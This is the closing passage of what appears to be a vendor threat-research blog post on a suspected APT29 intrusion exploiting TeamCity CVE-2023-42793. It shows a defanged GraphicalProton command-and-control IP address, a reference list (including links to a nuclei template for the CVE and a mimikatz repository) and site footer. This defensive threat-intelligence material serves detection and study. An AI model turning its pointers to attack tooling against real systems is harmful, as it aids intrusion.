</td>
<td width="96" rowspan="2" valign="top"><p>C2 IP address seen from GraphicalProton malware</p>
</td>
</tr><tr><td width="240" valign="top"><p>167[.]114[.]3[.]69</p>
<p> </p>
</td>
</tr></tbody></table>


</div>


    
    
    <div class="cmp cmp-text">
  <h2><span style="font-weight: normal;">Article References</span></h2>
<div><span style="font-weight: normal;"> </span></div>
<div><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref1" name="_ftn1" style="background-color: rgb(255,255,255);">[1]</a><span> https://nvd.nist.gov/vuln/detail/CVE-2023-42793</span><br />
</div>
<p><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref2" name="_ftn2">[2]</a> https://www.sonarsource.com/blog/teamcity-vulnerability/</p>
<p><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref3" name="_ftn3">[3]</a> https://www.jetbrains.com/teamcity/</p>
<p><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref4" name="_ftn4">[4]</a> https://attackerkb.com/topics/1XEEEkGHzt/cve-2023-42793/rapid7-analysis</p>
<p><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref5" name="_ftn5">[5]</a> https://www.cisa.gov/news-events/alerts/2023/10/04/cisa-adds-two-known-exploited-vulnerabilities-catalog-removes-five-kevs</p>
<p><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref6" name="_ftn1">[6]</a> https://github.com/projectdiscovery/nuclei</p>
<p><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref7" name="_ftn2">[7]</a> https://github.com/projectdiscovery/nuclei-templates/blob/016d696c4c964f47580f21a1219f6c878264a7a0/http/cves/2023/CVE-2023-42793.yaml#L52C34-L52C34</p>
<p><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref8" name="_ftn1">[8]</a> https://crt.sh/?q=d88fbe100874149e0059203fc1873958cde569deae66e1d934083006a4d5a258</p>
<p><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref9" name="_ftn1">[9]</a> https://www.mandiant.com/resources/blog/apt29-evolving-diplomatic-phishing</p>
<p><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref10" name="_ftn2">[10]</a> https://www.wired.com/story/the-untold-story-of-solarwinds-the-boldest-supply-chain-hack-ever/</p>
<p><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref11" name="_ftn3">[11]</a> https://go.recordedfuture.com/hubfs/reports/cta-2023-0727-1.pdf</p>
<p><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref12" name="_ftn4">[12]</a> https://learn.microsoft.com/en-us/iis/extensions/introduction-to-iis-express/iis-express-overview</p>
<p><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref13" name="_ftn5">[13]</a> https://attack.mitre.org/techniques/T1036/005/</p>
<p><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref14" name="_ftn6">[14]</a> https://attack.mitre.org/techniques/T1574/001/</p>
<p><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref15" name="_ftn1">[15]</a> https://pubs.opengroup.org/onlinepubs/009604599/functions/opendir.html</p>
<p><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref16" name="_ftn1">[16]</a> https://attack.mitre.org/techniques/T1003/002/</p>
<p><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref17" name="_ftn2">[17]</a> https://attack.mitre.org/techniques/T1003/002/</p>
<p><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref18" name="_ftn1">[18]</a> https://attack.mitre.org/techniques/T1136/001/</p>
<p><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref19" name="_ftn1">[19]</a> https://attack.mitre.org/techniques/T1047/</p>
<p><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref20" name="_ftn1">[20]</a> https://github.com/ParrotSec/mimikatz</p>
<p><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref21" name="_ftn1">[21]</a> https://go.recordedfuture.com/hubfs/reports/cta-2023-0727-1.pdf</p>
<p><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref22" name="_ftn1">[22]</a> https://attack.mitre.org/techniques/T1219</p>
<p><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref23" name="_ftn1">[23]</a> https://attack.mitre.org/techniques/T1053/005</p>
<p><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref24" name="_ftn2">[24]</a> https://go.recordedfuture.com/hubfs/reports/cta-2023-0727-1.pdf</p>
<p><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref25" name="_ftn3">[25]</a> https://www.mandiant.com/resources/blog/apt29-evolving-diplomatic-phishing</p>
<p><a href="/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793#_ftnref26" name="_ftn4">[26]</a> https://community.fortinet.com/t5/FortiGate/Technical-Tip-Blocking-and-monitoring-Tor-traffic/ta-p/196239</p>


</div>



        </div>
    </div>
</div>
</div>

    
</div>
</div>
<div class="b16-blog-tags aem-GridColumn aem-GridColumn--default--12">



  <div class="b16-blog-tags__container text-container" style="display:none">
    <span class="b16-blog-tags__headline">Tags:</span>
    <p class="b16-blog-tags__tag-links">
      <a href="https://www.fortinet.com/blog/tags-search.html?tag=cve">cve</a>
    </p>
  </div>

</div>
<section class="b12-related aem-GridColumn aem-GridColumn--default--12">




<div class="b12-related__container text-container">
    

    
    
    <h3>Related Posts</h3>
    <div class="b12-related__posts">
        
        <a href="/blog/ciso-collective/incident-response-plans-playbooks-policy" class="b12-related__post b12-related__post-0">
            <div class="b12-related__image" style="background-image:url(/content/dam/fortinet-blog/article-heros/incident-response-guide-thumbnail.png.thumb.319.319.png);">
                <img class="ratio" alt="A Guide to Incident Response Plans, Playbooks, and Policy" aria-hidden="true" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAADCAQAAAAe/WZNAAAADklEQVR42mNkgAJGDAYAAFEABCaLYqoAAAAASUVORK5CYII="/>
            </div>

            <div class="b12-related__text">
                <p class="b12-related__category">
                    CISO Collective
                </p>
                <h5 class="b12-related__title">A Guide to Incident Response Plans, Playbooks, and Policy</h5>
            </div>
        </a>
    
    
        
        <a href="/blog/threat-research/mranon-stealer-spreads-via-email-with-fake-hotel-booking-pdf" class="b12-related__post b12-related__post-1">
            <div class="b12-related__image" style="background-image:url(/content/dam/fortinet-blog/article-heros/mranon-stealer-thumbnail.png.thumb.319.319.png);">
                <img class="ratio" alt="MrAnon Stealer Spreads via Email with Fake Hotel Booking PDF" aria-hidden="true" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAADCAQAAAAe/WZNAAAADklEQVR42mNkgAJGDAYAAFEABCaLYqoAAAAASUVORK5CYII="/>
            </div>

            <div class="b12-related__text">
                <p class="b12-related__category">
                    FortiGuard Labs Threat Research
                </p>
                <h5 class="b12-related__title">MrAnon Stealer Spreads via Email with Fake Hotel Booking PDF</h5>
            </div>
        </a>
    
    
        
        <a href="/blog/threat-research/2024-threat-predictions-chained-ai-and-caas-operations" class="b12-related__post b12-related__post-2">
            <div class="b12-related__image" style="background-image:url(/content/dam/fortinet-blog/article-heros/2024-threat-predictions-thumbnail.png.thumb.319.319.png);">
                <img class="ratio" alt="Threat Predictions for 2024: Chained AI and CaaS Operations Give Attackers More “Easy” Buttons Than Ever" aria-hidden="true" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAADCAQAAAAe/WZNAAAADklEQVR42mNkgAJGDAYAAFEABCaLYqoAAAAASUVORK5CYII="/>
            </div>

            <div class="b12-related__text">
                <p class="b12-related__category">
                    FortiGuard Labs Threat Research
                </p>
                <h5 class="b12-related__title">Threat Predictions for 2024: Chained AI and CaaS Operations Give Attackers More “Easy” Buttons Than Ever</h5>
            </div>
        </a>
    
    </div>
</div>


</section>
<div class="b13-comment-section aem-GridColumn aem-GridColumn--default--12">


<div class="b13-comment-section__container text-container">


  
  
 </div>
</div>
<div class="b6-footer aem-GridColumn aem-GridColumn--default--12">


  

  <div class="b6-footer__container text-container">
    <div class="b6-footer__footer-info">
      <div class="b6-footer__logo">
        <a href="https://www.fortinet.com" target="_blank">
          <img src="/content/dam/fortinet-blog/fortinet-logo-white.svg" alt="Fortinet"/>
        </a>
      </div>
      <div class="b6-footer__social-footer">
        <ul>
          
            <li class="social-icon linkedin">
              <a href="https://www.linkedin.com/company/fortinet" target="_blank">
                
    <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
        <path d="M15.934 15.835H12.55v-5.712c0-.897-1.008-1.64-1.905-1.64s-1.48.743-1.48 1.64v5.712H5.78V5.68h3.385v1.693c.558-.905 1.996-1.49 2.96-1.49 2.116 0 3.81 1.727 3.81 3.817v6.135zm-11.846 0H.703V5.68h3.385v10.155zM2.395.605c.935 0 1.693.757 1.693 1.69 0 .936-.758 1.694-1.693 1.694S.703 3.23.703 2.29C.703 1.36 1.46.6 2.395.6z" fill-opacity=".8" fill="#fff" fill-rule="evenodd"></path>
    </svg>

              </a>
            </li>
          
            <li class="social-icon twitter">
              <a href="https://www.x.com/Fortinet" target="_blank">
                
    <svg width="1200" height="1227" viewBox="0 0 1200 1227" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M714.163 519.284L1160.89 0H1055.03L667.137 450.887L357.328 0H0L468.492 681.821L0 1226.37H105.866L515.491 750.218L842.672 1226.37H1200L714.137 519.284H714.163ZM569.165 687.828L521.697 619.934L144.011 79.6944H306.615L611.412 515.685L658.88 583.579L1055.08 1150.3H892.476L569.165 687.854V687.828Z" fill="white"/>
    </svg>

              </a>
            </li>
          
            <li class="social-icon youtube">
              <a href="https://www.youtube.com/channel/UCJHo4AuVomwMRzgkA5DQEOA?sub_confirmation=1" target="_blank">
                
    <svg viewBox="0 0 18 14" xmlns="http://www.w3.org/2000/svg">
        <path d="M7.472 11.027V3.412L12.55 7.22l-5.08 3.806zM15.934.787C15.426.62 12.294.45 9.164.45c-3.13 0-6.26.16-6.77.322-1.32.44-1.69 3.4-1.69 6.447 0 3.03.37 6 1.69 6.43.51.17 3.64.33 6.77.33 3.13 0 6.262-.16 6.77-.33 1.32-.43 1.692-3.4 1.692-6.44 0-3.047-.372-6-1.692-6.43z" fill-opacity=".8" fill="#fff" fill-rule="evenodd"></path>
    </svg>

              </a>
            </li>
          
            <li class="social-icon instagram">
              <a href="https://www.instagram.com/fortinet/" target="_blank">
                
    <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
        <path class="st0" d="M16,3.7c4,0,4.5,0,6.1,0.1c1.5,0.1,2.3,0.3,2.8,0.5c0.7,0.3,1.2,0.6,1.7,1.1c0.5,0.5,0.8,1,1.1,1.7
          c0.2,0.5,0.4,1.3,0.5,2.8c0.1,1.6,0.1,2.1,0.1,6.1s0,4.5-0.1,6.1c-0.1,1.5-0.3,2.3-0.5,2.8c-0.3,0.7-0.6,1.2-1.1,1.7
          c-0.5,0.5-1,0.8-1.7,1.1c-0.5,0.2-1.3,0.4-2.8,0.5c-1.6,0.1-2.1,0.1-6.1,0.1s-4.5,0-6.1-0.1c-1.5-0.1-2.3-0.3-2.8-0.5
          c-0.7-0.3-1.2-0.6-1.7-1.1c-0.5-0.5-0.8-1-1.1-1.7c-0.2-0.5-0.4-1.3-0.5-2.8C3.7,20.5,3.7,20,3.7,16s0-4.5,0.1-6.1
          c0.1-1.5,0.3-2.3,0.5-2.8C4.6,6.5,4.9,6,5.4,5.4c0.5-0.5,1-0.8,1.7-1.1c0.5-0.2,1.3-0.4,2.8-0.5C11.5,3.7,12,3.7,16,3.7 M16,1
          c-4.1,0-4.6,0-6.2,0.1C8.2,1.2,7.1,1.4,6.2,1.8c-1,0.4-1.8,0.9-2.7,1.7C2.7,4.4,2.2,5.2,1.8,6.2c-0.4,1-0.6,2-0.7,3.6
          C1,11.4,1,11.9,1,16c0,4.1,0,4.6,0.1,6.2c0.1,1.6,0.3,2.7,0.7,3.6c0.4,1,0.9,1.8,1.7,2.7c0.8,0.8,1.7,1.3,2.7,1.7
          c1,0.4,2,0.6,3.6,0.7C11.4,31,11.9,31,16,31s4.6,0,6.2-0.1c1.6-0.1,2.7-0.3,3.6-0.7c1-0.4,1.8-0.9,2.7-1.7c0.8-0.8,1.3-1.7,1.7-2.7
          c0.4-1,0.6-2,0.7-3.6C31,20.6,31,20.1,31,16s0-4.6-0.1-6.2c-0.1-1.6-0.3-2.7-0.7-3.6c-0.4-1-0.9-1.8-1.7-2.7
          c-0.8-0.8-1.7-1.3-2.7-1.7c-1-0.4-2-0.6-3.6-0.7C20.6,1,20.1,1,16,1L16,1z" fill-opacity=".8" fill="#fff" fill-rule="evenodd"></path>
        <path class="st0" d="M16,8.3c-4.3,0-7.7,3.4-7.7,7.7s3.4,7.7,7.7,7.7s7.7-3.4,7.7-7.7S20.3,8.3,16,8.3z M16,21c-2.8,0-5-2.2-5-5
          s2.2-5,5-5s5,2.2,5,5S18.8,21,16,21z" fill-opacity=".8" fill="#fff" fill-rule="evenodd"></path>
        <circle class="st0" cx="24" cy="8" r="1.8" fill-opacity=".8" fill="#fff" fill-rule="evenodd"></circle>
    </svg>

              </a>
            </li>
          
            <li class="social-icon facebook">
              <a href="https://www.facebook.com/fortinet" target="_blank">
                
    <svg viewBox="0 0 9 18" xmlns="http://www.w3.org/2000/svg">
        <path d="M8.934.758v3.385H7.24c-.583 0-.845.685-.845 1.27v2.114h2.54v3.385h-2.54v6.77H3.01v-6.77H.472V7.527H3.01V4.143c0-1.87 1.516-3.385 3.385-3.385h2.54z" fill-opacity=".8" fill="#fff" fill-rule="evenodd"></path>
    </svg>

              </a>
            </li>
          
            <li class="social-icon rss">
              <a href="https://www.fortinet.com/rss-feeds.html" target="_blank">
                
    <svg viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg">
        <path d="M3.072 17.68c-1.27 0-2.37-1.1-2.37-2.368 0-1.27 1.1-2.37 2.37-2.37s2.37 1.1 2.37 2.37-1.016 2.37-2.37 2.37zM.702.76v2.538c7.955 0 14.386 6.43 14.386 14.385h2.538C17.626 8.336 10.05.76.703.76zm0 5.162V8.46c5.078 0 9.224 4.146 9.224 9.223h2.54c0-6.514-5.248-11.76-11.763-11.76z" fill-opacity=".8" fill="#fff" fill-rule="evenodd"></path>
    </svg>

              </a>
            </li>
          
        </ul>
      </div>
    </div>
    <div class="b6-footer__footer-links">
      
        <div class="b6-footer__footer-links-column">
          <h4 class="b6-footer__header">News &amp; Articles</h4>
          <ul>
            
              <li>
                <a href="https://www.fortinet.com/corporate/about-us/newsroom/press-releases.html" target="_self">News Releases</a>
              </li>
            
              <li>
                <a href="https://www.fortinet.com/corporate/about-us/newsroom/news.html" target="_blank">News Articles</a>
              </li>
            
          </ul>
        </div>
      
        <div class="b6-footer__footer-links-column">
          <h4 class="b6-footer__header">Security Research</h4>
          <ul>
            
              <li>
                <a href="https://www.fortinet.com/fortiguard/threat-intelligence/threat-research.html" target="_self">Threat Research</a>
              </li>
            
              <li>
                <a href="https://fortiguard.com/" target="_self">FortiGuard Labs</a>
              </li>
            
              <li>
                <a href="https://www.fortinet.com/fortiguard/threat-intelligence/threat-map.html" target="_self">Threat Map</a>
              </li>
            
              <li>
                <a href="https://www.fortinet.com/solutions/ransomware.html" target="_self">Ransomware Prevention</a>
              </li>
            
          </ul>
        </div>
      
        <div class="b6-footer__footer-links-column">
          <h4 class="b6-footer__header">Connect With Us</h4>
          <ul>
            
              <li>
                <a href="https://community.fortinet.com/" target="_blank">Fortinet Community</a>
              </li>
            
              <li>
                <a href="https://www.fortinet.com/partners/partner-program/become-a-fortinet-partner" target="_blank">Partner Portal</a>
              </li>
            
              <li>
                <a href="https://investor.fortinet.com/" target="_blank">Investor Relations</a>
              </li>
            
              <li>
                <a href="https://www.fortinet.com/corporate/about-us/product-certifications" target="_blank">Product Certifications</a>
              </li>
            
          </ul>
        </div>
      
        <div class="b6-footer__footer-links-column">
          <h4 class="b6-footer__header">Company</h4>
          <ul>
            
              <li>
                <a href="https://www.fortinet.com/corporate/about-us/about-us" target="_blank">About Us</a>
              </li>
            
              <li>
                <a href="https://www.fortinet.com/corporate/about-us/executive-management" target="_self">Exec Mgmt</a>
              </li>
            
              <li>
                <a href="https://www.fortinet.com/corporate/careers" target="_self">Careers</a>
              </li>
            
              <li>
                <a href="https://www.fortinet.com/nse-training" target="_self">Training</a>
              </li>
            
              <li>
                <a href="https://www.fortinet.com/corporate/about-us/events" target="_self">Events</a>
              </li>
            
              <li>
                <a href="https://www.fortinet.com/corporate/about-us/industry-awards" target="_self">Industry Awards</a>
              </li>
            
              <li>
                <a href="https://www.fortinet.com/corporate/about-us/corporate-social-responsibility" target="_self">Social Responsibility</a>
              </li>
            
              <li>
                <a href="/resources/cyberglossary" target="_self">CyberGlossary</a>
              </li>
            
              <li>
                <a href="https://www.fortinet.com/sitemap" target="_self">Sitemap</a>
              </li>
            
              <li>
                <a href="https://www.fortinet.com/blog/blog-sitemap" target="_self">Blog Sitemap</a>
              </li>
            
          </ul>
        </div>
      
      <div class="b6-footer__contact-info">
        <h4 class="b6-footer__header">Contact Us</h4>
        <ul>
          <li>(866) 868-3678</li>
        </ul>
      </div>
    </div>
    <div class="b6-footer__copyright">
      <div class="b6-footer__copyright-info">
        <p class="b6-footer__copyright-text">Copyright © 2024 Fortinet, Inc. All Rights Reserved</p>
        
          <a class="b6-footer__copyright-link" href="https://www.fortinet.com/corporate/about-us/legal.html" target="_blank">Terms of Services</a>
        
          <a class="b6-footer__copyright-link" href="https://www.fortinet.com/corporate/about-us/privacy.html" target="_blank">Privacy Policy</a>
        
        <span class="ot-ftnt-cookie-settings"> | <a href="#" onclick="Optanon.ToggleInfoDisplay()">Cookie Settings</a></span>
      </div>
    </div>
  </div>

<!-- Launch COnfiguration -->


<!-- END Launch COnfiguration --></div>

    
</div>
</div>


    
    
    
    
    
<script src="/etc.clientlibs/fortinet-blog/clientlibs/clientlib-base.min.ba4f082a77dabb2c6baf715d9eb61c22.js"></script>





    


    

    <!-- BE IXF: The following <div> block needs to be placed in the location where the link block will be displayed
    BE IXF: For your website, the location is above/below ...-->
    <div class="be-ix-link-block">
        <!--
   be_sdkms_pub:bec-built-in; bec-built-in_1.0.0; bodystr;
   be_sdkms_date_modified:pn_tstr:Wed Oct 23 19:00:53 UTC 2024; pn_epoch:1729710053942;
   be_sdkms_timer: 0;
-->

        
    </div>
    <!-- BE IXF: Footer End -->
    </body>
    </html>
